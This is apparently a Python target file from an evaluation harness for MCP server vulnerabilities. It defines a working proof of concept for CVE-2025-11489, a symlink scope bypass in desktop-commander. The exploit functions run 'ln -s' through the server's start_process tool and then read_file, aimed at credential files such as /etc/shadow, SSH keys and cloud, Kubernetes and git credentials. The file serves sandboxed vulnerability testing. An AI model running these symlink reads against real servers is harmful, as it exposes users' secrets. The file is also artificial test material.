"""CVE-2025-11489: @wonderwhy-er/desktop-commander symlink scope bypass (CWE-59/CWE-61).

validatePath (src/tools/filesystem.ts) runs isPathAllowed on the unresolved path and only
afterwards calls fs.realpath, so an in-scope symlink whose target is outside the allowed directory
passes the scope check and read_file returns the out-of-scope target's bytes. The first patch 0.2.33
(a1177ec / PR #321) resolves the symlink with fs.realpath before the check and rejects it.

The layout is mounted read-write (filesystem_scope_env under a READ_WRITE host), so the exploit
creates the in-scope symlink itself through the server's own start_process tool (`ln -s`) and then
reads it: nothing is seeded inside the layout, which stays byte-for-byte universal.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve.detection.targets import Target
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_base import LayoutMount
from evals.cve_planting_spec import resolve_container_path
from evals.holdout_environments import filesystem_scope_env
from mcp_auditor.domain.ports import MCPClientPort

WORKING_DIRECTORY = "/srv/app"  # the in-scope checkout and the scope the launch passes
# The read path the exploit sends matches this, and the benign in-scope read of /srv/app/.git/HEAD
# does not, so an accidental surfacing by the benign call cannot read as aimed.
AIM = re.compile(r"/srv/app/x\d+")

# Every file-kind place reachable_by arbitrary_read: a nonce file is planted at the coordinate and
# the exploit links an in-scope path to it, so the symlink read surfaces exactly these. One
# non-file place is kept too, container-hostname, whose nonce Docker writes to /etc/hostname (via
# --hostname); the exploit links an in-scope path to it, so the same symlink-follow read surfaces
# it, exactly as for etc-hosts. proc-environ (kind=env) is not kept: read_file refuses
# /proc/self/environ as a binary (NUL-separated) file. The layout places are in the card's `unkept`.
KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "container-hostname",
)


def _coordinate_paths(places: Places, place_id: str) -> tuple[str, ...]:
    # The on-disk paths the real software writes the place's value to, which the exploit links an
    # in-scope path to. container-hostname surfaces through /etc/hostname (Docker fills it from
    # --hostname), as for the HOSTNAME-kind place in every read fixture.
    place = places[place_id]
    if place.kind is PlantKind.HOSTNAME:
        return ("/etc/hostname",)
    coordinates = place.coordinates
    raw = coordinates.paths if coordinates.paths is not None else (coordinates.path,)
    return tuple(
        resolve_container_path(path, WORKING_DIRECTORY) for path in raw if path is not None
    )


def _link_indices(places: Places, place_id: str) -> list[int]:
    # The flat enumeration of linked files (places in KEPT order, each coordinate path in order) so
    # an exploit's link name x<i> is the one it creates for its place.
    index = 0
    for current in KEPT_PLACES:
        paths = _coordinate_paths(places, current)
        if current == place_id:
            return list(range(index, index + len(paths)))
        index += len(paths)
    return []


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        for index, target in zip(
            _link_indices(places, place_id), _coordinate_paths(places, place_id), strict=True
        ):
            link = f"{WORKING_DIRECTORY}/x{index}"
            await client.call_tool(
                "start_process", {"command": f"ln -s {target} {link}", "timeout_ms": 5000}
            )
            await client.call_tool("read_file", {"path": link})

    run.__name__ = f"read_{place_id.replace('-', '_')}"
    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # An in-scope, non-symlink read: succeeds on both versions, carries no nonce, not aimed.
    await client.call_tool("read_file", {"path": f"{WORKING_DIRECTORY}/.git/HEAD"})


TARGET = Target(
    flaw_id="CVE-2025-11489",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.READ_OUTSIDE_SCOPE, MechanismClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"arbitrary_read", "command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2025-11489-desktop-commander",),
    server_image="holdout-2025-11489-desktop-commander",
    patched_image="holdout-2025-11489-desktop-commander-patched",
    planting_host=PlantingHost(
        SymbolicUser.UNPRIVILEGED,
        WORKING_DIRECTORY,
        has_network=False,
        layout_mount=LayoutMount.READ_WRITE,
    ),
    builder=filesystem_scope_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Symlink scope bypass (CWE-59/CWE-61): validatePath checks isPathAllowed on the unresolved "
        "path before fs.realpath, so read_file follows an in-scope symlink to an out-of-scope "
        "target. The exploit places the link itself through start_process on the read-write layout."
    ),
    tools_filter=None,
)
